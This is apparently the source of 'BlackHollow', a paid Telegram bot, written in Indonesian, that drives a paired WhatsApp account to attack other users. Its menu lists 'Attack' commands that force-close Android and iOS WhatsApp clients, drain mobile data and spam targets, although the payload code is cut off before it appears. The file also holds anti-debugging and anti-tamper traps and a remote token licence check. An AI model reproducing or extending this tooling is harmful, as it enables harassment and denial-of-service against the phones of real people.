const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require("path");
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    fetchLatestBaileysVersion,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    GroupSettingChange,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    encodeSignedDeviceIdentity,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = "https://raw.githubusercontent.com/rafaeladity/Databs/refs/heads/main/tokens.json";
const thumbnailUrl = "https://raw.githubusercontent.com/IkyyEzzXD/IkyyGantengPoll/main/uploads/1777161544637_file_1955.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
═════════════════════════
» Status: Bot Connected
═════════════════════════  
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
════════════════════════════════════════════ 
✖️ Token tidak terdaftar, Mohon membeli akses di @Rafaelanjay1
════════════════════════════════════════════
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
════════════════════════════════════════════   
✖️ Token tidak terdaftar, Mohon membeli akses di @Rafaelanjay1
════════════════════════════════════════════   
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
═════════════════════════
» Status: No Access
═════════════════════════  
✖️ Token tidak terdaftar, Mohon membeli akses di @Rafaelanjay1
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
════════════════════════
» Status: Bot Connected
═════════════════════════  
✖️ Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false; // volatile gate: require token each restart

// ==== GLOBAL LOCK: block everything until tokenValidated === true ====
bot.use((ctx, next) => {
  if (secureMode) return; // hard stop when secure mode on

  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : "";
  const cbData = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data.trim() : "";

  const isStartText = typeof text === "string" && text.toLowerCase().startsWith("/start");
  const isStartCallback = typeof cbData === "string" && cbData === "/start";

  if (!tokenValidated && !(isStartText || isStartCallback)) {
    if (ctx.callbackQuery) {
      try { ctx.answerCbQuery("🔒 ☇ Akses terkunci — validasi token lewat /start <token>"); } catch (e) {}
    }
    return ctx.reply("🔒 ☇ Akses terkunci. Ketik /start <token> untuk mengaktifkan bot.");
  }
  return next();
});


let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json';
const groupOnlyFile = './database/groupOnly.json';

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

bot.use((ctx, next) => {
  if (!groupOnly.enabled) return next();

  const isPrivate =
    ctx.chat?.type === "private" ||
    ctx.chat?.type === "channel";

  if (isPrivate) {
    return ctx.reply("❌ ☇ Mode Only Group aktif — command hanya bisa digunakan di grup");
  }

  return next();
});



const loadGroupOnly = () => {
  try {
    return JSON.parse(fs.readFileSync(groupOnlyFile));
  } catch {
    return { enabled: false };
  }
};

const saveGroupOnly = (data) => {
  fs.writeFileSync(groupOnlyFile, JSON.stringify(data, null, 2));
};

let groupOnly = loadGroupOnly();
const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
═════════════════════════
» Status: Bot Connected
═════════════════════════  
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
═════════════════════════
» Status: Sender Connected
═════════════════════════  
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("onlygcon", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  groupOnly.enabled = true;
  saveGroupOnly(groupOnly);

  ctx.reply("✅ ☇ Mode Only Group telah AKTIF\nSemua command hanya bisa dipakai di grup");
});

bot.command("onlygcoff", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  groupOnly.enabled = false;
  saveGroupOnly(groupOnly);

  ctx.reply("✅ ☇ Mode Only Group telah NONAKTIF\nCommand bisa dipakai di private & grup");
});

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.use((ctx, next) => {
    if (secureMode) return;

    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
                    (typeof data === "string" && data === "/start");

    if (!tokenValidated && !isStart) {
        if (ctx.callbackQuery) {
            try { ctx.answerCbQuery("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start <token>"); } catch (e) {}
        }
        return ctx.reply("🔒 ☇ Akses terkunci ketik /start <token> untuk mengaktifkan bot");
    }
    return next();
});

bot.start(async (ctx) => {
    if (!tokenValidated) {
      const raw = ctx.message && ctx.message.text ? ctx.message.text : "";
      const parts = raw.trim().split(" ");
      const userToken = parts.length > 1 ? parts[1].trim() : "";

      if (!userToken) {
        return ctx.reply("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start <token>");
      }

      try {
        const res = await axios.get(databaseUrl);
        const tokens = (res.data && res.data.tokens) || [];

        if (!tokens.includes(userToken) || userToken !== tokenBot) {
          return ctx.reply("❌ ☇ Token tidak terdaftar, masukkan yang valid");
        }

        tokenValidated = true;
        return ctx.reply("✅ ☇ Token berhasil diaktifkan, ketik /start untuk membuka menu utama");
      } catch (e) {
        return ctx.reply("❌ ☇ Gagal memverifikasi token");
      }
    }

    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const menuMessage = `
 <blockquote>𝙃𝙖𝙡𝙤 𝘽𝙖𝙣𝙜 𝙨𝙚𝙡𝙖𝙢𝙖𝙩 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 "𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰" 𝘽𝙚𝙧𝙗𝙞𝙟𝙖𝙠𝙡𝙖𝙝 𝙙𝙖𝙡𝙖𝙢 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣
 
╭━( 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 )
┃ ⌑ クリエイター : @Rafaelanjay1
┃ ⌑ バージョン : 1.0 
┃ ⌑ ステータス : Vip Only
┃ ⌑ ランタイム : ${runtimeStatus}
╰━━━━━━━━━━━━━━━━━━⭓
</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗠𝗲𝗻𝘂 ✘⌟",
                callback_data: "/controls"
            },
            {
                text: "⌜𝗔𝘁𝘁𝗮𝗰𝗸 ✘⌟",
                callback_data: "/bug"
            }
        ],
        [
            {   text: "⌜𝗧𝗼𝗼𝗹𝘀 ✘⌟",
                callback_data: "/tools"
            }
        ],
        [
            {
                text: "⌜𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 ✘⌟",
                callback_data: "/tqto"
            }
        ]
    ];

return ctx.replyWithPhoto(thumbnailUrl, {
  caption: menuMessage,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: keyboard
  }
});
});
bot.action('/start', async (ctx) => {
    if (!tokenValidated) {
        try { await ctx.answerCbQuery(); } catch (e) {}
        return ctx.reply("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start <token>");
    }
    
const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `
<blockquote>𝙃𝙖𝙡𝙤 𝘽𝙖𝙣𝙜 𝙨𝙚𝙡𝙖𝙢𝙖𝙩 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣 "𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰" 𝘽𝙚𝙧𝙗𝙞𝙟𝙖𝙠𝙡𝙖𝙝 𝙙𝙖𝙡𝙖𝙢 𝙢𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙠𝙖𝙣

╭━( 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 )
┃ ⌑ クリエイター : @Rafaelanjay1
┃ ⌑ バージョン : 1.0
┃ ⌑ ステータス : Vip Only
┃ ⌑ ランタイム : ${runtimeStatus}
╰━━━━━━━━━━━━━━━━━━⭓
</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗖𝗼𝗻𝘁𝗿𝗼𝗹  ✘⌟",
                callback_data: "/controls"
            },
            {
                text: "⌜𝗔𝘁𝘁𝗮𝗰𝗸 ✘⌟",
                callback_data: "/bug"
            }
        ],
        [
            {   text: "⌜𝗧𝗼𝗼𝗹𝘀 ✘⌟",
                callback_data: "/tools"
            }
        ],
        [
            {
                text: "⌜𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 ✘⌟",
                callback_data: "/tqto"
            }
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ===== CONTROLS MENU PAGE 1 =====
bot.action('/controls', async (ctx) => {

    const runtimeStatus = formatRuntime();
    
    const controlsMenu = `
<blockquote>╭━( 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 )
┃ ⌑ クリエイター : @Rafaelanjay1
┃ ⌑ バージョン : 1.0
┃ ⌑ ステータス : Vip Only
┃ ⌑ ランタイム : ${runtimeStatus}
╰━━━━━━━━━━━━━━━━━━⭓
╭━( 𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗠𝗲𝗻𝘂 )
┃ ⌑ /requestpair - Add Sender Number
┃ ⌑ /cekupdate - Cek Update Sc
┃ ⌑ /update - Update Sc
┃ ⌑ /setcooldown - Set Bot Cooldown
┃ ⌑ /resetsession - Reset Existing Session
┃ ⌑ /addpremium - Add Premium Users
┃ ⌑ /delpremium - Delete Premium Users
┃ ⌑ /addgcpremium - Add Premium Group
┃ ⌑ /delgcpremium - Delete Premium Group
╰━━━━━━━━━━━━━━━━━━⭓
</blockquote>`;

    const keyboard = [
        [
            { text: "⌜𝐍𝐞𝐱𝐭 𝐌𝐞𝐧𝐮 ✘⌟", callback_data: "/controls_next" }
        ],
        [
            {
                text: "⌜𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 ✘⌟",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description ===
            "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。"
        ) {
            await ctx.answerCbQuery();
        }
    }
});


// ===== CONTROLS MENU PAGE 2 =====
bot.action('/controls_next', async (ctx) => {

    const runtimeStatus = formatRuntime();
    
    const controlsMenu2 = `
<blockquote>╭━( 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 )
┃ ⌑ クリエイター : @Rafaelanjay1
┃ ⌑ バージョン : 1.0
┃ ⌑ ステータス : Vip Only
┃ ⌑ ランタイム : ${runtimeStatus}
╰━━━━━━━━━━━━━━━━━━⭓
╭━( 𝗖𝗼𝗻𝘁𝗿𝗼𝗹 𝗠𝗲𝗻𝘂 )
┃ ⌑ /addgcpremium - Add Premium Group
┃ ⌑ /delgcpremium - Delete Premium Group
┃ ⌑ /onlygcon - Enable Group Mode
┃ ⌑ /onlygcoff - Turning off Group Mode
╰━━━━━━━━━━━━━━━━━━⭓
</blockquote>`;

    const keyboard = [
        [
            { text: "⌜𝐁𝐚𝐜𝐤 ✘⌟", callback_data: "/controls" }
        ],
        [
            {
                text: "⌜𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 ✘⌟",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu2, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description ===
            "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。"
        ) {
            await ctx.answerCbQuery();
        }
    }
});

// ===== BUG MENU PAGE 1 =====
bot.action('/bug', async (ctx) => {

    const runtimeStatus = formatRuntime();
    
    const bugMenu = `
<blockquote>╭━( 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 )
┃ ⌑ クリエイター : @Rafaelanjay1
┃ ⌑ バージョン : 1.0
┃ ⌑ ステータス : Vip Only
┃ ⌑ ランタイム : ${runtimeStatus}
╰━━━━━━━━━━━━━━━━━━⭓
╭━( 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂 )
┃ ⌑ /xdelay - Delay Invisible ( Bebas Spam )
┃ ⌑ /xandro - Forclose Android And Sedot Kuota ( Bebas Spam )
┃ ⌑ /xios - Forclose Ios ( Bebas Spam )
╰━━━━━━━━━━━━━━━━━━⭓
</blockquote>`;

    const keyboard = [
        [
            { text: "⌜𝐍𝐞𝐱𝐭 𝐌𝐞𝐧𝐮 ✘⌟", callback_data: "/bug_next" }
        ],
        [
            { text: "⌜𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 ✘⌟", callback_data: "/start" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description ===
